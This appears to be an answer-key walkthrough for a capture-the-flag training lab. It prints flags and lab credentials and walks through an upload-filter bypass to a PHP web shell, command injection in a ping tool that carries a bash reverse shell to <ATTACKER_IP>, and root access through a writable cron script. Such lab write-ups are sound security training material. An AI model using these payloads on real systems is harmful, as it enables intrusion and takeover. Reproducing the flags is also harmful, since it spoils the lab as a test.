## Hard Lab - Complete Walkthrough

This document outlines the intended solution path for the Hard Lab.

### 1. Enumeration & Flag 1

* **Action:** An `nmap` scan reveals anonymous FTP is enabled. Log in and download `creds.txt` and `flag1.txt`.
* **Flag 1:** `OmahTIAcademy{hard_ftp_enum_start}`
* **Credentials:** The `creds.txt` file contains the credentials `webdeveloper:ComplexPass2025!`.

### 2. File Upload Bypass & Flag 2

* **Action:** Log into the "SocialGram" website with the found credentials. Navigate to the profile/settings page.
* **Action:** Attempt to upload a PHP shell. The upload will be rejected. The vulnerability requires bypassing a Content-Type filter.
* **Bypass:** Use Burp Suite to intercept the upload request. Change the `Content-Type` of the PHP file to `image/jpeg` and forward the request.
* **Result:** The PHP shell is successfully uploaded.
* **Action:** Get a web shell and explore the `/var/www/html/uploads/avatars` directory.
* **Flag 2:** Reading `flag2.txt` reveals `OmahTIAcademy{content_type_bypass}`.
* **Clue:** The `clue.txt` file points to the existence of a `/tools/` directory on the web server.

### 3. Command Injection & Flag 3

* **Action:** Navigate to the hidden tool page at `http://<TARGET_IP>/tools/`.
* **Action:** Identify the command injection vulnerability in the ping utility.
* **Exploitation:** Use the vulnerability to get a reverse shell.
    ```bash
    # On attacker machine, start a listener
    nc -lvnp 4444

    # In the ping tool, inject a reverse shell payload
    8.8.8.8; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
    ```
* **Result:** You will receive a shell as the `www-data` user.
* **Flag 3:** The flag is located at `/var/www/flag3.txt`.
    ```bash
    cat /var/www/flag3.txt
    ```

### 4. Privilege Escalation & Flag 4

* **Action:** From the `www-data` shell, enumerate the system. `linpeas.sh` will highlight a world-writable cron job script at `/usr/local/bin/backup.sh`.
* **Exploitation:** Overwrite the script with another reverse shell payload and start a new listener on port 5555.
* **Result:** Within one minute, you will receive a **root shell**.
* **Flag 4:** `cat /root/flag4.txt`

### 5. Post-Exploitation & Flag 5

* **Action:** As root, perform post-exploitation enumeration to find the final hidden flag.
* **Command:**
    ```bash
    find /opt -name "flag5.txt"
    ```
* **Result:** The command will find the flag at `/opt/deep/secret/folder/flag5.txt`.
* **Flag 5:** `cat /opt/deep/secret/folder/flag5.txt`
